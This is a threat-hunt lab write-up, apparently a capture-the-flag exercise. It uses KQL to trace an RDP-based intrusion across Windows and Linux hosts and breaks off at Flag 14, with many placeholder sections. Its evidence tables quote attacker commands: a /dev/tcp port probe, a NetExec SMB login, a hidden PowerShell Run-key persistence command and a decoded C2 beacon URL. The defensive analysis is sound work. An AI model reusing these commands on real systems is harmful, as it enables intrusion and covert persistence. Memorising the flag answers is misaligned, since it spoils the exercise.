<p align="center">
<img width="1402" height="1122" alt="image" src="https://github.com/user-attachments/assets/4d1f1b80-0f81-48fd-ad2d-da920c1fb9c2" />

</p>




# 🛡️ Threat Hunt Report – NorthPeak Descent

---

## 📌 Executive Summary

An attacker gained acces to the Northpeak Logistices enviornment using valid credentials over RDP, established persistence, pivoted between Windows and Linux systems, and ultimatley exfiltrated sensitive customer data without exploiting vulnerabilities or disabling security controls. This hunt demonstrates how legitimate credientials and living-off-the-land techniques can allow an attacker to evade detection while maintaining long-term access. 

The investigation reconstructs the complete attack chain, identigying the initial attack vector, internal pivoting with NetExec, persistence via a winows run registry key, an automated command-and-control beacon, and the exfiltration of a customer data export to a malicious domain. 

---

## 🎯 Hunt Objectives

- Identify malicious activity across endpoints and network telemetry  
- Correlate attacker behavior to MITRE ATT&CK techniques  
- Document evidence, detection gaps, and response opportunities  

---

## 🧭 Scope & Environment

- **Environment:**
  -  Northpeak Logistics enterprise environment (Windows workstations and servers, Linux host, Microsoft Sentinel & Microsoft Defender for Endpoint)
  -  Scope: Northpeak Hosts
    -`npt-ws01`
    -`npt-srv01`
    -`npt-linux01`  
- **Data Sources:**
  -  Microsoft Defender XDR
    - `DeviceProcessEvents`
    - `DeviceLogonEvents`
    - `DeviceNetworkEvents`
    - `DeviceRegistryEvents`
    - `DeviceFileEvents`
    - `DeviceEvents`
   - Microsoft Sentinel Log Analytics
- **Timeframe:**
  - 2026-06-16 → 2026-06-17 (20:00 UTC on June 16 through 00:30 UTC on June 17)

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
  - [🚩 Flag 1](#-flag-1)
  - [🚩 Flag 2](#-flag-2)
  - [🚩 Flag 3](#-flag-3)
  - [🚩 Flag 4](#-flag-4)
  - [🚩 Flag 5](#-flag-5)
  - [🚩 Flag 6](#-flag-6)
  - [🚩 Flag 7](#-flag-7)
  - [🚩 Flag 8](#-flag-8)
  - [🚩 Flag 9](#-flag-9)
  - [🚩 Flag 10](#-flag-10)
  - [🚩 Flag 11](#-flag-11)
  - [🚩 Flag 12](#-flag-12)
  - [🚩 Flag 13](#-flag-13)
  - [🚩 Flag 14](#-flag-14)
  - [🚩 Flag 15](#-flag-15)
  - [🚩 Flag 16](#-flag-16)
  - [🚩 Flag 17](#-flag-17)
  - [🚩 Flag 18](#-flag-18)
  - [🚩 Flag 19](#-flag-19)
  - [🚩 Flag 20](#-flag-20)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

<High-level narrative describing the attack lifecycle, key behaviors observed, and why this hunt matters.>

---

## 🧬 MITRE ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority |
|-----:|-------------------|----------|----------|
| 1 | <Placeholder> | <Placeholder> | <Placeholder> |
| 2 | <Placeholder> | <Placeholder> | <Placeholder> |
| 3 | <Placeholder> | <Placeholder> | <Placeholder> |
| 4 | <Placeholder> | <Placeholder> | <Placeholder> |
| 5 | <Placeholder> | <Placeholder> | <Placeholder> |
| 6 | <Placeholder> | <Placeholder> | <Placeholder> |
| 7 | <Placeholder> | <Placeholder> | <Placeholder> |
| 8 | <Placeholder> | <Placeholder> | <Placeholder> |
| 9 | <Placeholder> | <Placeholder> | <Placeholder> |
| 10 | <Placeholder> | <Placeholder> | <Placeholder> |
| 11 | <Placeholder> | <Placeholder> | <Placeholder> |
| 12 | <Placeholder> | <Placeholder> | <Placeholder> |
| 13 | <Placeholder> | <Placeholder> | <Placeholder> |
| 14 | <Placeholder> | <Placeholder> | <Placeholder> |
| 15 | <Placeholder> | <Placeholder> | <Placeholder> |
| 16 | <Placeholder> | <Placeholder> | <Placeholder> |
| 17 | <Placeholder> | <Placeholder> | <Placeholder> |
| 18 | <Placeholder> | <Placeholder> | <Placeholder> |
| 19 | <Placeholder> | <Placeholder> | <Placeholder> |
| 20 | <Placeholder> | <Placeholder> | <Placeholder> |

---

## 🔍 Flag Analysis

_All flags below are collapsible for readability._

---

<details>
<summary id="-flag-1">🚩 <strong>Flag 1: The Real Foothold <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "They didn't exploit anything to get in. One external address got onto the Windows estate cleanly and worked it interactively. Give me that source and how they came through."`

### 📌 Finding
The attacker successfully authenticated to a Windows host from an external source using legitimate credentials. The activity did not indicate exploitation; instead, the attacker used a valid-account intrusion to gain interactive access and begin post-compromise activity.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | `npt-ws01` |
| Timestamp | 2026-06-16T20:58:02.3673704Z  |
| Process | RDP / RemoteInteractive |

### ⚠️ Impact, Risk, and Relevance

The attacker obtained an initial foothold into the Windows environment by authenticating through Remote Desktop Protocol (RDP) using valid credentials. This allowed the attacker to establish an interactive session on the Windows system without exploiting a vulnerability, making the activity appear similar to legitimate administrative access.

The primary risk is that compromised credentials combined with RDP access provide an attacker with direct control of an internal endpoint. From this foothold, the attacker could perform reconnaissance, execute commands, move laterally across the network, escalate privileges, establish persistence, and access sensitive data.

This finding is significant because the intrusion relied on legitimate authentication mechanisms rather than malware or exploitation. Monitoring abnormal RDP authentication attempts, external RDP exposure, unusual source IP addresses, and privileged account usage is critical for detecting similar valid-account attacks.

### 🔧 KQL Query Used
```kql
DeviceLogonEvents
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| where Timestamp between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where isnotempty( RemoteIP) 
| where LogonType contains "remote" or LogonType contains "interactive"
| project DeviceName, AccountName, TimeGenerated, LogonType, ActionType, Protocol
| order by TimeGenerated asc 
```

### 🖼️ Screenshot
<img width="1262" height="277" alt="image" src="https://github.com/user-attachments/assets/248d5efe-217c-40d8-bbb4-bf87a31007f2" />

**Answer:** 
`npt-ws01`, `148.64.103.173`

</details>

---

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: First Foothold, Ordering <Technique Name></strong> </summary>

### 🎯 Objective
`HUNT LEAD: "There's more than one foothold here, and the obvious story has the Linux box first. Don't take that on trust. Prove which one actually came first, and name it."` 

### 📌 Finding
During the investigation, the Linux workstation initially appeared to be the first foothold due to the amount of attacker activity observed on the system. Timeline analysis disproved this assumption. The Linux workstation's first successful logon occurred at `2026-06-16T22:01:38.373679Z`, while the Windows workstation had already been accessed at `2026-06-16T20:58:02.3673704Z` through authenticated RDP. This confirms that the Windows workstation was the attacker's true initial foothold. 

### 🔍 Evidence

| Field               | Value                        |
| ------------------- | ---------------------------- |
| Initial Foothold    | `npt-ws01`                    |
| Initial Access Time | 2026-06-16T20:58:02.3673704Z |
| Access Method       | RDP/RemoteInteractive        |
| Later Accessed Host | `npt-linux01`                  |
| Linux Access Time   | 2026-06-16T22:01:38.373679Z  |
| Access Method       | RDP/Network                  |


### 💡 Why it matters
Identifying the true initial foothold is critical for accurately reconstructing the attack timeline. Although the Linux workstation appeared suspicious due to the volume of attacker activity and post-compromise actions, timeline analysis confirmed that it was accessed after the Windows workstation.

The attacker first gained access to the Windows environment through authenticated RDP access at `2026-06-16T20:58:02.3673704Z`. The Linux workstation was accessed later at `2026-06-16T22:01:38.373679Z`, indicating it was not the initial entry point.

This finding demonstrates the importance of validating attack assumptions through authentication timelines rather than relying on the most visibly active system. Misidentifying the first compromised host could lead to incorrect containment actions, missed indicators of compromise, and an incomplete understanding of attacker movement throughout the environment.

### 🔧 KQL Query Used
```kql
DeviceLogonEvents
| where DeviceName has_any ("npt-linux01")
| where Timestamp between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where ActionType == "LogonSuccess"
| where isnotempty( RemoteIP)
| project DeviceName, TimeGenerated, ActionType, LogonType, RemoteIP
| order by TimeGenerated asc 
```

### 🖼️ Screenshot
<img width="1162" height="325" alt="image" src="https://github.com/user-attachments/assets/db4c8bf8-dfdc-49a6-8ed7-e256b0f62709" />

**Answer:** 
`npt-ws01`, `148.64.103.173`

</details>

---

<details>
<summary id="-flag-3">🚩 <strong>Flag 3: Operator Workstation Name <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "They were sloppy. Something they connected with announced itself on every remote session into the estate. Name it."`
<What the attacker was trying to accomplish>

### 📌 Finding
Remote session telemetry consistently recorded the attacker's originating device name as `Loranse`. Every interactive remote session into the Windows estate exposed the same client device name, allowing the operator's system to be identified despite their use of legitimate credentials.

### 🔍 Evidence

| Field                          | Value                                               |
| ------------------------------ | --------------------------------------------------- |
| **Host**                       | `npt-ws01` (also observed on npt-srv01)               |
| **Timestamp**                  | `2026-06-16T20:58:02.3673704Z` (first observed)       |
| **Process**                    | Remote interactive session                          |
| **Parent Process**             | N/A (Remote Session Metadata)                       |
| **Command Line**               | N/A (Captured via `ProcessRemoteSessionDeviceName`) |
| **Remote Session Device Name** | **Loranse**                                         |


### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| where Timestamp between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where IsProcessRemoteSession == true
| project DeviceName, TimeGenerated, ProcessRemoteSessionDeviceName
| order by TimeGenerated asc 
```

### 🖼️ Screenshot
<img width="975" height="239" alt="image" src="https://github.com/user-attachments/assets/80ac474e-c7e4-42f8-835b-dad20ecb3760" />

**Answer:** `Loranse` 

</details>

---

<details>
<summary id="-flag-4">🚩 <strong>Flag 4: SRV01 Access Vector <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "The server took its own way in, it wasn't reached from inside. Reconstruct it: the method, the source, the session type."`
 
<What the attacker was trying to accomplish>

### 📌 Finding
npt-srv01 was accessed with remote IP 148.64.103.173 with LogonType RemoteInteractive. Utilizing DeviceNetworkEvents we can see that the remote port used was port 3389 (RDP). 

### 🔍 Evidence

| Field              | Value                                                                |
| ------------------ | -------------------------------------------------------------------- |
| **Host**           | npt-srv01                                                            |
| **Timestamp**      | 2026-06-16T20:48:41.8686404Z *(first observed RDP network activity)* |
| **Process**        | Remote Desktop Session (LogonSuccess)                                |
| **Parent Process** | N/A (Interactive Logon Event)                                        |
| **Command Line**   | N/A (Authentication event captured through `DeviceLogonEvents`)      |


### 💡 Why it matters
This finding demonstrates that the attacker established a direct remote desktop session to npt-srv01 from an external IP address instead of laterally moving from another compromised internal system. Direct exposure of RDP services to the Internet significantly increases the risk of unauthorized access, particularly when attackers possess valid credentials. Correlating successful logon events with network telemetry confirms both the access method and source, providing high-confidence evidence of the initial server compromise and supporting accurate attack path reconstruction

### 🔧 KQL Query Used
```kql
DeviceLogonEvents
| where DeviceName has_any ("npt-srv01")
| where Timestamp between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where ActionType == "LogonSuccess"
| where isnotempty( RemoteIP)
| project TimeGenerated, AccountName, DeviceName, RemoteIP, ActionType, LogonType
| order by TimeGenerated asc 
```

```kql
DeviceNetworkEvents
| where DeviceName has_any ("npt-srv01")
| where Timestamp between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where RemoteIP == "148.64.103.173"
| where isnotempty( RemoteIP)
| project TimeGenerated, DeviceName, RemoteIP, LocalPort, ActionType
| order by TimeGenerated asc
```
### 🖼️ Screenshot
<img width="975" height="291" alt="image" src="https://github.com/user-attachments/assets/8fb5926b-0bcd-4d34-83ee-22b3675b377d" />
<img width="975" height="193" alt="image" src="https://github.com/user-attachments/assets/339a0f5f-7df1-476e-b1ee-2c77e96daece" />



### 🛠️ Detection Recommendation

**Answer :** `RDP, 148.64.103.173, RemoteInteractive`  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-5">🚩 <strong>Flag 5: Sudo Enumeration <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "First thing on the Linux box, they checked what they could escalate with. Give me the exact command. They fumbled it once before they got it right, that's how you'll spot the real one."`
 
<What the attacker was trying to accomplish>

### 📌 Finding
The attacker launched a Bash shell and executed the sudo -l command at 2026-06-16T22:16:52.687226Z to enumerate the current user's sudo permissions. Prior to the successful execution, they mistyped the command during an attempt at 2026-06-16T22:11:28.916766Z, providing a clear indicator of hands-on-keyboard activity rather than an automated process.

### 🔍 Evidence

| Field              | Value                       |
| ------------------ | --------------------------- |
| **Host**           | npt-linux01                 |
| **Timestamp**      | 2026-06-16T22:16:52.687226Z |
| **Process**        | bash                        |
| **Parent Process** | sshd                        |
| **Command Line**   | `sudo -l`                   |


### 💡 Why it matters
The `sudo -l` command is a common post-compromise reconnaissance technique used to determine which commands a user can execute with elevated privileges. By identifying misconfigured or passwordless sudo permissions, an attacker can quickly assess potential privilege escalation paths to root. The preceding failed attempt also indicates an interactive operator manually typing commands, helping distinguish human activity from automated malware or scripts. Detecting early privilege enumeration is valuable because it often precedes privilege escalation and broader compromise of Linux systems.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName has_any ("npt-linux01")
| where Timestamp between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where ProcessCommandLine contains "sudo"
| project Timestamp, DeviceName, ProcessCommandLine
```
### 🖼️ Screenshot

<img width="975" height="480" alt="image" src="https://github.com/user-attachments/assets/53ac7634-81a4-4000-8294-3e47549fba61" />


### 🛠️ Detection Recommendation

**Answer :** 
`sudo -l` 

<Actionable guidance for defenders>

</details>
  
---

<details>
<summary id="-flag-6">🚩 <strong>Flag 6: Reachability Technique <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "They checked whether the Windows boxes were reachable before they pivoted, and they did it without dropping a single tool on the box. Tell me how they checked, and the one port they cared about. That port tells you what they were about to do."`

### 📌 Finding
The attacker used Bash's built-in `/dev/tcp` functionality to test connectivity to a Windows host over `TCP port 3389`, the default port for Remote Desktop Protocol (RDP). Because `/dev/tcp` is a native Bash feature, the attacker was able to verify network reachability without installing or executing any additional network scanning tools. The successful connection check strongly suggests they were preparing to pivot to the Windows workstation using RDP.

### 🔍 Evidence

| Field | Value |
|------|-------|
| **Host** | npt-linux01 |
| **Timestamp** | 2026-06-16T22:02:16.855726Z |
| **Process** | bash |
| **Parent Process** | sshd |
| **Command Line** | `bash -c 'echo > /dev/tcp/<Windows_IP>/3389'` *(connection test using `/dev/tcp`)* |

### 💡 Why it matters
Using `/dev/tcp` is a stealthy reconnaissance technique because it leverages built-in shell functionality instead of external utilities such as `nc`, `telnet`, or `nmap`. This reduces forensic artifacts while allowing the attacker to confirm that RDP was accessible before attempting lateral movement. Detecting native port checks can reveal attacker reconnaissance that might otherwise evade traditional tool-based detections and provides an early indicator of an impending pivot.


### 🔧 KQL Query Used
```kql
DeviceNetworkEvents
| where DeviceName == "npt-linux01"
| where TimeGenerated  between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where RemotePort == "3389"
| project TimeGenerated, RemoteIP, RemotePort, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img width="975" height="80" alt="image" src="https://github.com/user-attachments/assets/c178e86f-d3dd-41b0-8840-48a45e460bb7" />

**Answer:**  
`/dev/tcp, 3389`

</details>

---

<details>
<summary id="-flag-7">🚩 <strong>Flag 7: Operator tooling <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "Before leaving Linux they kitted out, checked for a couple of capabilities, then committed to installing one tool. Name what they installed."`

### 📌 Finding
The attacker executed two `which` checks at `2026-06-16T22:25:17.448121Z` and `2026-06-16T22:27:55.924868Z` to verify if any Remote Desktop Protocol (RDP) client utilities were installed on the Linux machine. Following this, they installed `pipx` at `2026-06-16T22:29:11.188108Z` using the `sudo apt-get install -y pipx` command. They then used `pipx` to install `NetExec` at `2026-06-16T22:29:16.741036Z`, providing the attacker with additional capabilities for network discovery, credential validation, and lateral movement.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | npt-linux01 |
| Timestamp | 2026-06-16T22:29:16.741036Z |
| Process | pipx |
| Parent Process | python |
| Command Line | `pipx install netexec` |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName == "npt-linux01"
| where AccountName == "sancadmin"
| project Timestamp, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| order by Timestamp asc
```


### 🖼️ Screenshot

<img width="1390" height="536" alt="image" src="https://github.com/user-attachments/assets/6f824fa2-025f-4ce3-a1f6-b4a41716741c" />

### 🛠️ Detection Recommendation

**Answer:**
Netexec
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-8">🚩 <strong>Flag 8: Lateral Movement Triple <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "Now they come back at the workstation from inside the network. Build me that hop: the account, the internal source, the target."`

### 📌 Finding
After preparing the Linux host with the required tooling, the attacker used the `sancadmin` account to laterally move from `npt-linux01` (`10.2.0.30`) to `npt-ws01` over `SMB` using `NetExec`. The connection occurred at `2026-06-16T22:32:18.5821153Z`, demonstrating the attacker had successfully pivoted from the compromised Linux system into the Windows environment using valid credentials.



### 🔍 Evidence


| Field | Value |
|------|-------|
| Host | npt-linux01 |
| Timestamp | 2026-06-16T22:32:18.5821153Z |
| Process | netexec/SMB |
| Parent Process | python |
| Command Line | `netexec smb 10.2.0.10 -u sancadmin ...` *(credential arguments omitted)* |

### 💡 Why it matters
This marks the attacker's transition from reconnaissance into `lateral movement`. Rather than exploiting a vulnerability, they authenticated to a Windows workstation using valid credentials over SMB, allowing them to move deeper into the environment without triggering exploit-based detections.

The use of `NetExec` indicates a hands-on-keyboard operator leveraging legitimate administrative protocols to access internal systems. Because SMB is a trusted protocol in most enterprise networks, this type of activity can blend in with normal administration unless correlated with unusual source hosts, accounts, or command-line activity.


### 🔧 KQL Query Used
Verify the connection to `npt-ws01` at remote ip `10.2.0.10`

```kql
DeviceNetworkEvents
| where DeviceName == "npt-linux01"
| where RemoteIP == "10.2.0.10"
| where TimeGenerated  between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| project TimeGenerated, ActionType, InitiatingProcessCommandLine, RemoteIP
| order by TimeGenerated desc
```
Verify IP address for the connection. 
```kql
DeviceLogonEvents
| where DeviceName == "npt-ws01"
| where TimeGenerated  between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where AccountName == "sancadmin"
| project TimeGenerated, AccountName, DeviceName, LogonId, LogonType, RemoteIP
```

### 🖼️ Screenshot
[Connection using SMB and Netexec] <img width="975" height="83" alt="image" src="https://github.com/user-attachments/assets/3317dba4-2403-406b-895b-b2ac6d160643" />
[Remote IP] <img width="975" height="203" alt="image" src="https://github.com/user-attachments/assets/b119f829-a7ea-43bc-ab5b-89e8d1f5e567" />


### 🛠️ Detection Recommendation

**Answer:**  
sancadmin, 10.2.0.30, npt-ws01

</details>

---

<details>
<summary id="-flag-9">🚩 <strong>Flag 9: Operator PowerShell Lineage <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "That workstation is drowning in PowerShell and nearly all of it is the machine talking to itself. Separate the human at the keyboard from the noise, and tell me what gives them away."`

### 📌 Finding
The workstation generated numerous PowerShell executions, but nearly all were launched by the `SYSTEM` account as part of normal Windows activity. By filtering on the initiating account and parent process, the interactive user activity becomes apparent.

Unlike the automated PowerShell instances, several processes were executed under the `sancadmin` account, including `powershell.exe`, `cmd.exe`, and `Explorer.EXE`. The presence of `Explorer.EXE` indicates an interactive desktop session, distinguishing the attacker's hands-on activity from the background PowerShell noise generated by the operating system.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | npt-ws01 |
| Timestamp | 2026-06-16 (during attacker activity window) |
| Process | Explorer.EXE |
| Parent Process | N/A |
| Command Line | `Explorer.EXE` |

### 💡 Why it matters
PowerShell is commonly used by Windows services, WMI, Defender, and administrative components, making it a noisy telemetry source. Simply alerting on `powershell.exe` would generate numerous false positives.

Instead, defenders should pivot on `interactive user context`. The combination of `Explorer.EXE`, `powershell.exe`, and `cmd.exe` running under the `sancadmin` account identifies the human operator's session, allowing analysts to distinguish attacker activity from legitimate system-generated PowerShell executions.


### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName == "npt-ws01"
| where TimeGenerated  between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where InitiatingProcessCommandLine has_any ("explorer.exe", "powershell.exe", "cmd.exe", "firefox") 
| summarize Count = count() by InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Count desc  
```

### 🖼️ Screenshot
<img width="876" height="520" alt="image" src="https://github.com/user-attachments/assets/bec400cd-b685-49ca-a081-0a6da8fe5d7c" />


### 🛠️ Detection Recommendation

**Answere:**  
`Explorer.EXE`

</details>

---

<details>
<summary id="-flag-10">🚩 <strong>Flag 10: Persistence Full Command <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "They tried their staging script out a few times first, then trusted it enough to make it survive a reboot. Give me the full command they planted to bring it back, path and all."`

### 📌 Finding
By searching the registry keys we can see that the attacker established persistence on npt-ws01 by creating a Windows Run registry key entry under the Administrator account. They configured Windows to automatically launch a PowerShell script (NorthpeakSyncTray.ps1) every time the user logged in. The command used hidden execution, bypassed PowerShell restrictions, and stored the script in C:\ProgramData\Northpeak\NorthpeakSync\Bin\ to blend in with legitimate software and survive reboots.

After repeatedly testing their staging script, the attacker established persistence on `npt-ws01` by creating a `Windows Run` registry key under the `Administrator` account. The Run key ensured the malicious PowerShell script would execute automatically each time the user logged on, allowing the attacker to regain execution after a reboot.

To reduce visibility and evade common security controls, the command launched PowerShell with `NoProfile`, `WindowStyle Hidden`, and `ExecutionPolicy Bypass`. The payload, `NorthpeakSyncTray.ps1`, was stored under `C:\ProgramData\Northpeak\NorthpeakSync\Bin\`, a directory and filename chosen to resemble legitimate application files.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | npt-ws01 |
| Timestamp | 2026-06-16 2026-06-16T23:04:16.721307Z |
| Process | powershell.exe |
| Parent Process | powershell.exe |
| Command Line | `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1"` |

### 💡 Why it matters
Run registry keys are one of the most common Windows persistence mechanisms because they survive system reboots and execute automatically during user logon. By storing the payload in **ProgramData** and using a filename that resembles legitimate synchronization software, the attacker attempted to blend into the operating system while maintaining long-term access.

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
```kql
DeviceRegistryEvents
| where DeviceName == "npt-ws01"
| where TimeGenerated  between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where RegistryKey has @"CurrentVersion\Run"
| project TimeGenerated, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData,InitiatingProcessFileName
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img width="975" height="260" alt="image" src="https://github.com/user-attachments/assets/8e9552cb-3ca3-4ecd-a92a-e9007b03d076" />

**Answer:**  
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1"

</details>

---

<details>
<summary id="-flag-11">🚩 <strong>Flag 11: Beacon Domains, Cross-Source <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "Their channel ran on three look-alike subdomains, but your network record only ever caught one of them. Find all three, in the order they were first contacted, and tell me where the other two were hiding."`

### 📌 Finding
he attacker used three look-alike subdomains as part of their command-and-control infrastructure. Only one domain was observed in network telemetry through `DeviceNetworkEvents`, while the remaining two domains were discovered through process command-line artifacts in `DeviceProcessEvents`. The domains were contacted in the following order:

1. `status.sync-northpeak.com`
2. `updates.sync-northpeak.com`
3. `cdn.sync-northpeak.com`

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | npt-ws01 |
| Timestamp | 2026-06-16T20:58:02.3673704Z |
| Process | powershell.exe |
| Parent Process | powershell.exe |
| Command Line | PowerShell command containing sync-northpeak.com C2 domain references |

### 💡 Why it matters
The use of multiple similar-looking domains is a common command-and-control evasion technique designed to blend malicious infrastructure with legitimate-looking traffic. Relying only on network telemetry would have missed two of the three C2 domains. Cross-source correlation between `DeviceNetworkEvents` and `DeviceProcessEvents` exposed the full attacker infrastructure.

### 🔧 KQL Query Used
Domain found in DeviceNetworkEvents
```kql
DeviceNetworkEvents
| where DeviceName == "npt-ws01"
| where TimeGenerated  between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| project Timestamp, RemoteUrl, RemoteIP, InitiatingProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc
|summarize Count=count() by RemoteUrl
```
Two seperate domains found in DeviceProcessEvents
```kql
DeviceProcessEvents
| where DeviceName has_any ("npt-ws01", "npt-linux01", "npt-srv01")
| where TimeGenerated  between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where ProcessCommandLine contains "north"
|project TimeGenerated, DeviceName, ProcessCommandLine
|order by TimeGenerated asc 
```

### 🖼️ Screenshot
<img width="814" height="456" alt="image" src="https://github.com/user-attachments/assets/bc37b149-2ef9-4c49-94f5-7a64831196f6" />

<img width="975" height="177" alt="image" src="https://github.com/user-attachments/assets/87b5ecf4-1511-4986-a339-8833c20bf506" />

**Answer:**  
status.sync-northpeak.com, updates.sync-northpeak.com, cdn.sync-northpeak.com; DeviceProcessEvents

</details>

---

<details>
<summary id="-flag-12">🚩 <strong>Flag 12: Encoded Beacon Decode <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "One of those beacons was deliberately wrapped to hide where it was calling. Unwrap it and give me the full address, every parameter on the end."`

### 📌 Finding
The attacker used an encoded command to conceal the destination of a beacon request. By decoding the Base64-encoded PowerShell content found in process telemetry, the hidden command-and-control URL was revealed:
`https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09`
The encoded payload was used to obscure the C2 infrastructure and evade simple command-line detections.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | npt-ws01 |
| Timestamp | 2026-06-16T20:58:02.3673704Z |
| Process | powershell.exe |
| Parent Process | cmd.exe |
| Command Line | powershell.exe -EncodedCommand containing Base64 encoded beacon request |

### 💡 Why it matters
Attackers frequently encode PowerShell commands to hide malicious activity from security tools and analysts reviewing command-line telemetry. Encoding does not provide encryption, but it can bypass simple string-based detections by hiding keywords, URLs, and execution logic.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName has_any ("npt-ws01", "npt-linux01", "npt-srv01")
| where TimeGenerated  between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where ProcessCommandLine has_any ("Invoke-WebRequest", "encoded", "base64", "EncodedCommand")
|project TimeGenerated, DeviceName, ProcessCommandLine
|order by TimeGenerated asc 
```

### 🖼️ Screenshot
<img width="975" height="467" alt="image" src="https://github.com/user-attachments/assets/24088843-2e94-499e-93e7-40fb52e4f73b" />

### 🛠️ Detection Recommendation

**Answer:**
https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09


</details>

---

<details>
<summary id="-flag-13">🚩 <strong>Flag 13: Encoded-Command Discrimination <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "Pull every wrapped command and most of them are innocent system chatter, not the operator. Name what's generating that chatter, and prove to me you can tell it apart from the few that matter."`

### 📌 Finding
The investigation revealed that the majority of encoded PowerShell commands were not generated by the attacker but by a legitimate background process, `gc_worker.exe`. This process was responsible for producing recurring encoded command activity that created noise within process telemetry.By comparing encoded command events and their initiating processes, the malicious operator activity could be separated from normal system-generated PowerShell execution. The attacker-generated commands were identified by their unique execution context, timing, and behavior rather than simply the presence of encoded content.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | npt-ws01 |
| Timestamp | 2026-06-16|
| Process | powershell.exe |
| Parent Process | gc_worker.exe |
| Command Line | Encoded PowerShell command generated by gc_worker.exe |

### 💡 Why it matters
Encoded PowerShell commands are commonly associated with malicious activity because attackers use Base64 encoding to hide scripts, URLs, and execution logic. However, not every encoded command represents an attack.

Understanding the parent-child process relationship allowed defenders to distinguish legitimate automated activity from attacker behavior. Without this context, analysts could waste time investigating benign events or miss the smaller number of truly malicious commands hidden among normal telemetry.

This analysis helps:
- Reduce false positives during threat hunting.
- Identify abnormal PowerShell execution patterns.
- Focus investigation efforts on suspicious parent processes and user activity.
- Improve detections by incorporating process ancestry.


### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where DeviceName has_any ("npt-ws01", "npt-linux01", "npt-srv01")
| where TimeGenerated  between (datetime(2026-06-16 20:00:00) .. datetime(2026-06-17 00:30:00))
| where ProcessCommandLine has_any ("EncodedCommand", "encodedCommand")
|project TimeGenerated, InitiatingProcessAccountName, InitiatingProcessCommandLine, ProcessCommandLine
|order by TimeGenerated asc 
|summarize Count=count() by InitiatingProcessCommandLine
```

### 🖼️ Screenshot
<img width="975" height="149" alt="image" src="https://github.com/user-attachments/assets/f3e4e7f0-047d-462c-a1f4-1bf446602f16" />

**Answer:**  
gc_worker.exe

</details>

---

<details>
<summary id="-flag-14">🚩 <strong>Flag 14: Beacon Rhythm <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "Look at the spacing between the early check-ins to the first domain. Don't give me a number. Tell me what that rhythm proves about what's driving the channel."`

### 📌 Finding
